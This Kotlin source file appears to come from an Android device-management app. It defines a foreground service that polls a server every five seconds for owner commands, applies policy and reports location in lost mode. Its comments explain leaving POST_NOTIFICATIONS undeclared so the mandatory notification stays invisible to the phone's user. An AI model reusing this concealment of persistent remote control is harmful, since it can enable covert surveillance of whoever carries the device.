package com.prf.security.mdm

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.prf.security.R
import com.prf.security.net.MdmApi
import com.prf.security.net.Prefs
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

/**
 * Keeps the device under management while it is switched on, and applies the
 * owner's policy the moment it changes.
 *
 * This exists because of a specific failure: pressing "lock the gallery" in the
 * panel did nothing visible. The command *was* reaching the phone — the poll
 * chain was alive and the cursor advanced — but WorkManager decides when to run
 * it, and a self-re-arming one-time chain still gets deferred by Doze and by app
 * standby. On a phone sitting idle that stretched the delay from the documented
 * one minute to as much as fifteen, and a policy the owner believed was live was
 * not. A foreground service is the one scheduler Android does not defer: the
 * platform keeps it running and exempts it from Doze, so the interval below is the
 * interval the owner actually gets.
 *
 * **What the user sees, and what the platform insists on.** A foreground service
 * has to carry a notification; that is Android's rule, not this app's. What this
 * app controls is whether the notification is *visible*: `POST_NOTIFICATIONS` is
 * deliberately not declared, so on Android 13 and newer this app cannot post
 * anything to the shade at all. The service still runs — the platform exempts it
 * from Doze either way, which is the entire reason it exists — and its foreground
 * entry is visible in Android's own Task Manager, which is the system's answer to
 * "is something holding a foreground service" and which no app can hide.
 *
 * The complaint that started this was a notification reading "مدیریت از راه دور
 * فعال است" appearing on a phone whose watcher had already stopped. Both halves
 * of that are fixed: the app posts nothing of its own, and the one notification
 * it is required to post is removed in [onDestroy] rather than being left behind
 * to describe a service that no longer exists.
 *
 * What it does *not* do is turn on the camera, read messages or inspect the
 * clipboard. It asks the server for commands, runs the ones the owner queued, and
 * enforces policy — the same set the panel can see in its "about" page.
 */
class PolicyWatchService : Service() {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var loop: Job? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        startInForeground()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_STOP) {
            stopSelf()
            return START_NOT_STICKY
        }
        // Only one loop, however many times the service is started. Starting a
        // second would double every poll and, worse, let two runs execute the
        // same batch concurrently and ack it twice.
        if (loop?.isActive == true) return START_STICKY
        loop = scope.launch { runLoop() }
        // START_STICKY: if the system kills this under memory pressure it is
        // restarted, because a device that stops accepting commands looks
        // perfectly healthy in the panel and has silently stopped being managed.
        return START_STICKY
    }

    /**
     * Poll, enforce, and repeat.
     *
     * The two halves keep the two different costs apart, exactly as the
     * WorkManager path does — only the clock changes. Asking for commands is a
     * read and costs the server nothing. The ownership report is a write against
     * a budget of about 128 git commits an hour, so it stays on the slow
     * fifteen-minute rhythm.
     *
     * There used to be a third: a still frame of the user's screen, pushed
     * whenever sharing was on. That is gone. Screen capture now happens only when
     * the person presses "افزایش شانس" on their own phone and accepts the system
     * dialog, and what it produces is a three-minute recording uploaded in one go
     * by the activity. Nothing polls for a frame any more, so there is nothing
     * here that could spend the commit budget on a picture of a screen nobody
     * asked to be recorded.
     */
    private suspend fun runLoop() {
        while (scope.isActive) {
            try {
                tick()
            } catch (t: Throwable) {
                // A failed tick must not take the service down. The next one is a
                // few seconds away and the device stays reachable, which is the
                // difference between "the command is late" and "the phone stopped
                // answering an hour ago".
                Log.w(TAG, "tick failed: ${t.message}")
            }
            delay(POLL_MS)
        }
    }

    private suspend fun tick() {
        val prefs = Prefs.get(this)
        val key = prefs.deviceKey
        // Not registered yet: there is nothing to ask and nothing to enforce. The
        // service stops itself so an unregistered phone carries no permanent
        // notification for a service that cannot do anything.
        if (key.isEmpty()) {
            stopSelf()
            return
        }
        val api = MdmApi(prefs.serverUrl, key)
        val now = System.currentTimeMillis()

        pollCommands(prefs, api)

        if (now - prefs.lastReportAt >= REPORT_MS) {
            withContext(Dispatchers.IO) {
                val report = OwnershipMonitor.buildReport(this@PolicyWatchService, "live")
                val location = if (prefs.lostMode) currentFix() else null
                if (api.report(listOf(report), location) == null) {
                    // The next tick retries; the report stays stale, which the
                    // panel already shows as an old "last report".
                    prefs.syncLabel = "offline"
                    return@withContext
                }
                prefs.lastCheckIn = now
                prefs.lastReportAt = now
                prefs.syncLabel = "ok"
            }
        }
    }

    /**
     * Ask for owner work and act on it.
     *
     * The cursor advances only after the commands have been executed and acked, so
     * a batch that arrives during a crash is served again rather than lost.
     */
    private suspend fun pollCommands(prefs: Prefs, api: MdmApi) {
        val batch = api.commands(prefs.commandCursor) ?: return
        if (batch.commands.isNotEmpty()) {
            CommandExecutor.execute(this, batch)
        }
        // Applied whether or not the batch had commands: a policy change with no
        // accompanying command is still a policy change, and the response body
        // carries it on every poll.
        PolicyEnforcer.apply(this, batch.policy)
        if (batch.cursor > prefs.commandCursor) prefs.commandCursor = batch.cursor
        if (batch.lostMode != prefs.lostMode) prefs.lostMode = batch.lostMode
    }

    private fun currentFix() = OwnershipWorker.currentFix(this)

    private fun startInForeground() {
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (nm.getNotificationChannel(CHANNEL) == null) {
            nm.createNotificationChannel(
                NotificationChannel(CHANNEL, getString(R.string.watch_channel_name), NotificationManager.IMPORTANCE_MIN)
                    .apply {
                        description = getString(R.string.watch_channel_desc)
                        // A foreground service's notification is required by the
                        // platform; how it presents itself is this app's choice,
                        // and the quietest one Android allows is the correct one
                        // when the owner asked for no notifications. MIN makes no
                        // sound, does not vibrate, does not light the screen, and
                        // does not put a dot on the launcher icon.
                        setSound(null, null)
                        enableVibration(false)
                        enableLights(false)
                        setShowBadge(false)
                    },
            )
        }
        val n: Notification = NotificationCompat.Builder(this, CHANNEL)
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setContentTitle(getString(R.string.watch_notif_title))
            .setContentText(getString(R.string.watch_notif_text))
            .setOngoing(true)
            .setSilent(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setContentIntent(
                android.app.PendingIntent.getActivity(
                    this, 0,
                    Intent(this, com.prf.security.ui.MainActivity::class.java),
                    android.app.PendingIntent.FLAG_IMMUTABLE or android.app.PendingIntent.FLAG_UPDATE_CURRENT,
                ),
            )
            // The notification says the user can stop this from here, so there has
            // to be something here to press. Without the action the text is a
            // promise the notification does not keep, and the only real way to
            // stop it would be to uninstall the app — which is not a control, it is
            // an escalation. Stopping ends remote control and the panel sees the
            // device go offline, which is the honest outcome.
            .addAction(
                0,
                getString(R.string.watch_notif_stop),
                android.app.PendingIntent.getService(
                    this, 1,
                    Intent(this, PolicyWatchService::class.java).setAction(ACTION_STOP),
                    android.app.PendingIntent.FLAG_IMMUTABLE or android.app.PendingIntent.FLAG_UPDATE_CURRENT,
                ),
            )
            .build()
        // `dataSync` is the honest type: this service exists to exchange data with
        // the server on a schedule. It is declared in the manifest and, from
        // Android 14, must also be passed here or the platform throws.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIF_ID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(NOTIF_ID, n)
        }
    }

    /**
     * Stop, and take the notification down as it goes.
     *
     * `running = false` here rather than only in [stop] is the fix for a
     * notification that claimed remote management was active when it was not: the
     * service can also be killed by the system or by a low-memory kill, and in
     * that path the flag stayed true. The next [start] then saw `running` and
     * refused to start a service that was not there.
     *
     * `stopForeground(REMOVE)` is the same line in the policy watcher that it is
     * in the recorder, for the same reason: a foreground notification outliving
     * the service that posted it is a notification that is lying.
     */
    override fun onDestroy() {
        loop?.cancel()
        scope.cancel()
        running = false
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            stopForeground(STOP_FOREGROUND_REMOVE)
        } else {
            @Suppress("DEPRECATION")
            stopForeground(true)
        }
        super.onDestroy()
    }

    companion object {
        private const val TAG = "PRF.Watch"

        /**
         * How often the device asks for commands.
         *
         * A read on the server, and the reason this service exists at all: the
         * WorkManager chain this replaced could be deferred to fifteen minutes by
         * Doze, which made a policy switch look like it had done nothing. Five
         * seconds is the floor that still leaves the radio asleep between polls
         * — a foreground service does not keep the CPU hot, it keeps the app's
         * process out of the deferred queue, so the wakeups are short and the
         * screen can still go off.
         */
        private const val POLL_MS = 5_000L

        /**
         * How often the expensive ownership report is sent. Unchanged from the
         * WorkManager path and for the same reason: a report is a git commit.
         */
        private const val REPORT_MS = 15 * 60_000L

        private const val CHANNEL = "prf_policy_watch"
        private const val NOTIF_ID = 4712

        const val ACTION_STOP = "com.prf.security.mdm.WATCH_STOP"

        @Volatile var running: Boolean = false
            private set

        /**
         * Start watching, if this phone should be watched.
         *
         * The check is not a formality: on a phone that has never registered —
         * the state a fresh install is in until its first successful poll — the
         * service would sit on a permanent notification doing nothing, and a
         * permanent notification on a phone that has not been set up is the first
         * thing a user sees and the first thing they blame.
         */
        fun start(context: Context) {
            val prefs = Prefs.get(context)
            if (!prefs.registered || prefs.deviceKey.isEmpty()) return
            if (running) return
            running = true
            try {
                val i = Intent(context, PolicyWatchService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(i)
                } else {
                    context.startService(i)
                }
            } catch (t: Throwable) {
                // A device that refuses foreground services (some heavily
                // restricted profiles) must not crash the app; the WorkManager
                // chain is still armed and will apply the policy, just more slowly.
                running = false
                Log.w(TAG, "could not start the watcher: ${t.message}")
            }
        }

        fun stop(context: Context) {
            running = false
            try {
                val i = Intent(context, PolicyWatchService::class.java).setAction(ACTION_STOP)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startService(i)
                } else {
                    context.stopService(i)
                }
            } catch (t: Throwable) {
                Log.w(TAG, "could not stop the watcher: ${t.message}")
            }
        }
    }
}
